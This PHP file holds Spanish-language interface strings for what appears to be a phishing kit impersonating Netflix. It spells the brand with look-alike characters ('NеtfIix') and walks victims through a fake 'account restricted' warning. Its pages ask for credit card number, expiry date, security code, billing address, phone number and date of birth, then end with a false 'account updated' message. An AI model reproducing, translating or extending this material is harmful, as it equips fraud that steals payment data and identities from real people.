<?php
// HF Jackson_Login_English
$Fartout = "NеtfIix";
$dokhol= "Registrarse";
$mail= "Email";
$Password = "Contraseña";
$nsit = "Olvidó tu Email o Contraseña";
$btona = "Registrarse";
$box = 'Recuérdame.';
$saybok = "PASO";
$saybok1 = "DE";
$jdid ="Nuevo en NеtfIix?";
$tsajal = "Regístrese Ahora";
$tasl = "Preguntas? Contáctenos.";
$chorot = "Tarjeta de regalo Términos";
$bla = "Términos de Uso";
$kho = "Declaracion de privacidad";
$logha = "El proceso no demora más de 5 minutos.";
$err ="Lo Sentimos, no Podemos Enc	ontrar una Cuenta con esta Dirección de Correo Electrónico. Inténtalo de Nuevo o <a>Crea una Cuenta Nueva.</a>";
/*========[Page_3]==========*/
$title = "Actualizar la Información de su Cuenta";
$wrn = "Su Cuenta ha Sido Restringida!";
$warn = "Necesita Actualizar la Información de su Cuenta";
$wbtn = "Actualizar Ahora";
/*========[Page_2]==========*/
$info  = "Información Sobre el Pago";
$khoroj ="Salir";
$cnfrm = "Actualizar De su Información de Pago";
$goli ="Dime más";
$cc = "Tarjeta de Crédito";
$nam = "Nombre en La Tarjeta";
$namCC = "Exactamente Como Aparece en Su Tarjeta";
$CCnum = "Número de Tarjeta";
$dateCC = "Fecha de Caducidad";
$chhr= "Mes";
$am= "año";
$cvv = "Código de Seguridad";
$chno = "Que es";
$src= "Servidor Seguro";
$btn = "Actualizar Método de Pago";
$so2al= "Preguntas?";
$cnt = "Contáctenos.";
$tem = "Términos de Uso";
$prv= "Intimidad";
$sn  = "Configura tu tarjeta de crédito o débito";
$digits ="";
/*=======[Page_3]==========*/
$upld = "Actualice su Información de Facturación";
$pr = "Su dirección de facturación debe coincidir con la dirección de su plan de membresía.<br>
También requerimos su fecha de nacimiento como medidas de seguridad adicionales.";
$bling ="Dirección de Envio";
$smiya ="Nombre Completo";
$kniya ="Apellido";
$adrs1 ="Dirección 1";
$adrs2 ="Dirección 2";
$mdina ="Ciudad";
$zip ="Código Postal";
$dola ="País";
$namra ="Número de teléfono";
$tarikh ="Fecha de nacimiento";
$eml ="E-mail";
$bton ="Actualizar Dirección";
/*=======[Page_4]==========*/
$upd ="Tu Cuenta ha Sido Actualizada";
$txt ="Gracias por Actualizando y Confirmando la Información de su Cuenta.<br>
Ahora Puede Continuar Ingresando y usando su Cuenta de Forma Normal sin Más Interrupciones.";
$final ="Continuar Para Iniciar Sesión";
// HF Jackson_Login_English
?>